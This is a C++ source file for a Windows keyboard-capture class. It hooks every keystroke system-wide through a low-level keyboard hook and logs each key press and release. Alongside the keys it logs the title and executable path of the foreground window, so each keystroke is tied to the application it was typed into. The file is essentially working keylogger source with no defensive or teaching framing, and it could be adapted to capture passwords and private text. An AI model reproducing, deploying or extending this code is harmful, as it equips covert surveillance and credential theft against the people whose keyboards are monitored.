#include "RHookKeyboard.h"
#include <Psapi.h>
#pragma comment (lib,"Psapi.lib")  
static BOOL gs_is_init = FALSE;
static CRITICAL_SECTION gs_cs_name;
static wstring gs_last_window_title = L"";
static wstring gs_last_window_file_name = L"";
LRESULT CALLBACK KeyboardProc(_In_ int nCode,
	_In_ WPARAM wParam, _In_ LPARAM lParam)
{
	KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
	if (nCode >= 0) {
		if (WM_KEYDOWN == wParam || WM_SYSKEYDOWN == wParam) {
			if (VK_SHIFT == ks->vkCode || VK_LSHIFT == ks->vkCode || 
				VK_RSHIFT == ks->vkCode || VK_CONTROL == ks->vkCode ||
				VK_RCONTROL == ks->vkCode || VK_LCONTROL == ks->vkCode ||
				VK_LWIN == ks->vkCode || VK_RWIN == ks->vkCode ||
				VK_MENU == ks->vkCode || VK_LMENU == ks->vkCode ||
				VK_RMENU == ks->vkCode) {
				USHORT us = ::GetAsyncKeyState(ks->vkCode);
				if (0 == us || 1 == us)
					RHookKeyboard::KeyboardRecord(ks->vkCode, TRUE);
			}
			else {
				RHookKeyboard::KeyboardRecord(ks->vkCode, TRUE);
			}
		}
		else if (WM_KEYUP == wParam || WM_SYSKEYUP == wParam) {
			RHookKeyboard::KeyboardRecord(ks->vkCode, FALSE);
		}
	}
	return ::CallNextHookEx(NULL, nCode, wParam, lParam);
}

RHookKeyboard::RHookKeyboard()
{
	if (!gs_is_init) {
		::InitializeCriticalSection(&gs_cs_name);
		gs_is_init = TRUE;
	}
}
RHookKeyboard::~RHookKeyboard()
{
	
}

void RHookKeyboard::Running() 
{
	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, "keyboard_hook_c");
	if (ERROR_ALREADY_EXISTS == GetLastError()) return;
	this->m_keyboardHook = ::SetWindowsHookEx(
		WH_KEYBOARD_LL,
		KeyboardProc,
		::GetModuleHandleW(NULL),
		NULL
	);
	if (NULL != this->m_keyboardHook) {
		MSG msg;
		do
		{
			if (::PeekMessageW(&msg, NULL, NULL, NULL, PM_REMOVE)) {
				::TranslateMessage(&msg);
				::DispatchMessageW(&msg);
			}
			else
				Sleep(0);
		} while (TRUE);
		::UnhookWindowsHookEx(this->m_keyboardHook);
	}
	if (NULL != hMutex) ::ReleaseMutex(hMutex);
}


static void ChangeLastWindow(wstring _title, wstring _fileName)
{
	if (0 != _title.compare(L"") || 0 != _fileName.compare(L"")) {
		EnterCriticalSection(&gs_cs_name);
		gs_last_window_title = _title;
		gs_last_window_file_name = _fileName;
		LeaveCriticalSection(&gs_cs_name);
	}
}
static BOOL IsLastWindow(wstring _title, wstring _fileName)
{
	EnterCriticalSection(&gs_cs_name);
	BOOL ret = (0 == _title.compare(gs_last_window_title) &&
		0 == _fileName.compare(gs_last_window_file_name));
	LeaveCriticalSection(&gs_cs_name);
	return ret;
}
static list<wstring> GetCurrentTopWindowInfo()
{
	list<wstring> _list;
	wchar_t windowTitle[MAX_PATH] = { 0 };
	wchar_t windowFileName[0x1000] = { 0 };
	HWND hWnd = ::GetForegroundWindow();
	::GetWindowTextW(hWnd, windowTitle, MAX_PATH);
	if (NULL != hWnd) {
		DWORD pid = 0;
		if (::GetWindowThreadProcessId(hWnd, &pid)) {
			HANDLE hProcess = ::OpenProcess(
				PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
			if (NULL != hProcess) {
				::GetModuleFileNameExW(hProcess, NULL, windowFileName, 0x1000);
			}
		}
	}
	_list.push_back(windowTitle);
	_list.push_back(windowFileName);
	return _list;
}

BOOL RHookKeyboard::IsCapsLk()
{
	return 1 == ::GetKeyState(VK_CAPITAL);
}

void RHookKeyboard::KeyboardRecord(DWORD vkCode, BOOL _isDown)
{
	list<wstring> _list = GetCurrentTopWindowInfo();
	if (!IsLastWindow(_list.front(), _list.back())) {
		printf_s("[%S---%S]\r\n", _list.back().c_str(), _list.front().c_str());
		ChangeLastWindow(_list.front(), _list.back());
	}
	printf_s("%d:%d\r\n", _isDown, vkCode);
}